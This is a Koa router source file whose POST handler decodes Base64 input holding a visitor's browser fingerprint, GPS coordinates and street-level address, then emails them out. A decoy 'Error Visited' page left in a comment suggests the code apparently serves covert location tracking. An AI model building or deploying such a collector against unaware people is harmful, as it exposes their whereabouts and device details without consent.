const router = require("koa-router")();
const { setMail, getHtml } = require("./mail");
const { Base64 } = require("./secret");
const { QueueData }  = require("./queue");


router.get("/", async (ctx, next) => {
  QueueData.push(123)
  ctx.type = "html";
  ctx.body = QueueData;
    // `<h2 style="color: #F56C6C; text-align: center;margin-top: 10%;">Error Visited</h2>`;
  ctx.status = 200;
  await next();
});

router.post("/", async (ctx, next) => {
  const { data: reqBody } = ctx.request.body;
  const decodeStr = Base64.decode(reqBody);
  const { navigator, lngLat, data } = JSON.parse(decodeStr);

  let htmlList = "";

  const {
    userAgent, //由客户机发送服务器的 user-agent 头部的值
    appName, //浏览器的名称
    appVersion, //浏览器的平台和版本信息
    hardwareConcurrency, //cpu核心数
    platform //运行浏览器的操作系统平台
  } = navigator;

  htmlList += getHtml("userAgent", userAgent);
  htmlList += getHtml("appName", appName);
  htmlList += getHtml("appVersion", appVersion);
  htmlList += getHtml("hardwareConcurrency", hardwareConcurrency);
  htmlList += getHtml("platform", platform);

  const { lat, lng } = lngLat;
  htmlList += getHtml("lat", lat);
  htmlList += getHtml("lng", lng);

  const { address, content } = data;
  htmlList += getHtml("address", address);

  const { address: _address, address_detail } = content;
  htmlList += getHtml("content", _address);

  const { province, city, district, street } = address_detail;

  htmlList += getHtml("province", province);
  htmlList += getHtml("city", city);
  htmlList += getHtml("district", district);
  htmlList += getHtml("street", street);

  await setMail(htmlList);

  ctx.status = 200;
  await next();
});

module.exports = router;
